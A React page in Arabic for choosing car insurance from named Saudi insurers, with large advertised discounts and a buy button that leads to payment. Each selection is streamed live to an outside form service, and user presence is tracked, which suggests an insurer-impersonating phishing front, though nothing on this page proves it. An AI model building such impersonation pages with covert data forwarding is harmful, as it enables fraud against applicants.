import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Shield, CheckCircle2 } from "lucide-react";
import { ChatButton } from "@/components/ChatButton";
import { Footer } from "@/components/Footer";
import { useFormspreeSync } from "@/hooks/useFormspreeSync";
import { useAutoSave } from "@/hooks/useAutoSave";
import { useApplicationData } from "@/hooks/useApplicationData";
import { usePresence } from "@/hooks/usePresence";
import malathLogo from "@/assets/malath-logo.png";
import amanaLogo from "@/assets/amana-logo.png";
import walaaLogo from "@/assets/walaa-logo.png";
interface InsuranceCompany {
  id: number;
  name: string;
  regularPrice: string;
  salePrice: string;
  logo: string;
  discount?: string;
}
const InsuranceSelection = () => {
  const navigate = useNavigate();
  const [insuranceType, setInsuranceType] = useState<"comprehensive" | "third-party" | null>(null);
  const [selectedCompany, setSelectedCompany] = useState<string>("");
  const { applicationId, createOrUpdateApplication } = useApplicationData();
  usePresence(applicationId || undefined);
  
  useEffect(() => {
    console.log('Insurance selection page mounted with applicationId:', applicationId);
  }, [applicationId]);

  // Send data to Formspree in real-time
  useFormspreeSync({
    insuranceType,
    selectedCompany
  }, "صفحة اختيار التأمين - Insurance Selection");

  // Auto-save to database in real-time
  useAutoSave(applicationId, {
    selected_company: selectedCompany,
    current_step: 'insurance_selection'
  }, "InsuranceSelection");

  // شركات التأمين - ضد الغير
  const thirdPartyCompanies: InsuranceCompany[] = [{
    id: 1,
    name: "شركة ملاذ للتأمين - التأمين ضد الغير للسيارات الفردية",
    regularPrice: "599",
    salePrice: "299",
    logo: malathLogo,
    discount: "خصم 50%"
  }, {
    id: 2,
    name: "شركة أمانة للتأمين - التأمين ضد الغير للسيارات الفردية",
    regularPrice: "799",
    salePrice: "450",
    logo: amanaLogo,
    discount: "خصم 44%"
  }, {
    id: 3,
    name: "شركة ولاء للتأمين - التأمين ضد الغير للسيارات الفردية",
    regularPrice: "899",
    salePrice: "599",
    logo: walaaLogo,
    discount: "خصم 33%"
  }];

  // شركات التأمين - شامل
  const comprehensiveCompanies: InsuranceCompany[] = [{
    id: 11,
    name: "شركة بروج للتأمين التعاوني - التأمين الشامل على المركبات",
    regularPrice: "2,051.00",
    salePrice: "899.00",
    logo: "https://static.wixstatic.com/media/a4d98c_618ae961f5854eabb4222bf8217783af~mv2.png/v1/fill/w_223,h_125,al_c,q_85,usm_0.66_1.00_0.01,enc_avif,quality_auto/a4d98c_618ae961f5854eabb4222bf8217783af~mv2.png",
    discount: "خصم 30% لعدم وجود مطالبات"
  }, {
    id: 12,
    name: "الشركة الخليجية العامة للتأمين - التأمين الشامل للسيارات الفردية",
    regularPrice: "1,015.00",
    salePrice: "507.50",
    logo: "https://static.wixstatic.com/media/a4d98c_87bca84adf174fcb93b2002bddc2a63f~mv2.png/v1/fill/w_223,h_125,al_c,q_85,usm_0.66_1.00_0.01,enc_avif,quality_auto/a4d98c_87bca84adf174fcb93b2002bddc2a63f~mv2.png"
  }, {
    id: 13,
    name: "شركة ميد غولف للتأمين - التأمين الشامل للمركبات",
    regularPrice: "2,266.95",
    salePrice: "1,133.48",
    logo: "https://static.wixstatic.com/media/a4d98c_6d65f436e14f463db8c9ec3c953a9708~mv2.png/v1/fill/w_223,h_125,al_c,q_85,usm_0.66_1.00_0.01,enc_avif,quality_auto/a4d98c_6d65f436e14f463db8c9ec3c953a9708~mv2.png",
    discount: "خصم 30% لعدم وجود مطالبات"
  }, {
    id: 14,
    name: "شركة تكافل الراجحي - التأمين الشامل على المركبات",
    regularPrice: "1,616.00",
    salePrice: "808.00",
    logo: "https://static.wixstatic.com/media/a4d98c_c1540e762dba4775bc16c34ae137a95e~mv2.png/v1/fill/w_223,h_125,al_c,q_85,usm_0.66_1.00_0.01,enc_avif,quality_auto/a4d98c_c1540e762dba4775bc16c34ae137a95e~mv2.png",
    discount: "خصم 25% لعدم وجود مطالبات"
  }];
  const displayedCompanies = insuranceType === "comprehensive" ? comprehensiveCompanies : insuranceType === "third-party" ? thirdPartyCompanies : [...thirdPartyCompanies, ...comprehensiveCompanies];
  return <div className="min-h-screen bg-background">
      <section className="pt-8 pb-16 px-4 md:px-6">
        <div className="container mx-auto max-w-7xl">
          <h2 className="text-3xl md:text-4xl font-bold text-center mb-8">
            اختر نوع التأمين
          </h2>

          {/* Insurance Type Selection */}
          <div className="flex justify-center gap-4 mb-12">
            <Button variant={insuranceType === "comprehensive" ? "default" : "outline"} size="lg" onClick={() => setInsuranceType("comprehensive")} className="text-lg px-8 py-6">
              <Shield className="ml-2 h-5 w-5" />
              شامل
            </Button>
            <Button variant={insuranceType === "third-party" ? "default" : "outline"} size="lg" onClick={() => setInsuranceType("third-party")} className="text-lg px-8 py-6">
              <Shield className="ml-2 h-5 w-5" />
              ضد الغير
            </Button>
          </div>

          {/* Additional Coverage Option */}
          <div className="flex justify-center mb-8">
            
          </div>

          {/* Insurance Companies Grid */}
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6 mb-8">
            {displayedCompanies.map(company => <Card key={company.id} className="relative p-6 hover:shadow-lg transition-shadow">
                {company.discount && <div className="absolute top-2 right-2 bg-black text-white text-xs px-3 py-1 rounded">
                    {company.discount}
                  </div>}
                <div className="flex flex-col items-center space-y-4">
                  <div className="w-full h-32 flex items-center justify-center bg-white rounded">
                    <img src={company.logo} alt={company.name} className="max-w-full max-h-full object-contain" />
                  </div>
                  <h3 className="font-semibold text-center text-sm min-h-[60px]">{company.name}</h3>
                  <div className="flex flex-col items-center gap-1">
                    <p className="text-sm text-red-500 line-through">
                      سعر عادي {company.regularPrice}﷼
                    </p>
                    <p className="text-xl font-bold text-primary">
                      سعر البيع {company.salePrice}﷼
                    </p>
                  </div>
                  <Button className="w-full bg-emerald-600 hover:bg-emerald-700 text-white" onClick={async () => {
                setSelectedCompany(`${company.name} - السعر: ${company.salePrice}﷼`);
                
                try {
                  await createOrUpdateApplication({
                    selected_company: company.name,
                    selected_price: company.salePrice,
                    regular_price: company.regularPrice,
                    company_logo: company.logo,
                    current_step: 'insurance_selection'
                  });
                  
                  navigate(`/payment?company=${encodeURIComponent(company.name)}&price=${company.salePrice}&regularPrice=${company.regularPrice}`);
                } catch (error) {
                  console.error('Error saving selection:', error);
                }
              }}>
                    إشتري الآن
                  </Button>
                </div>
              </Card>)}
          </div>

          {/* Navigation Buttons */}
          <div className="flex justify-center gap-4 mt-12">
            <Button variant="outline" size="lg" onClick={() => navigate("/vehicle-info")} className="px-12">
              السابق
            </Button>
          </div>
        </div>
      </section>

      <ChatButton />
      <Footer />
    </div>;
};
export default InsuranceSelection;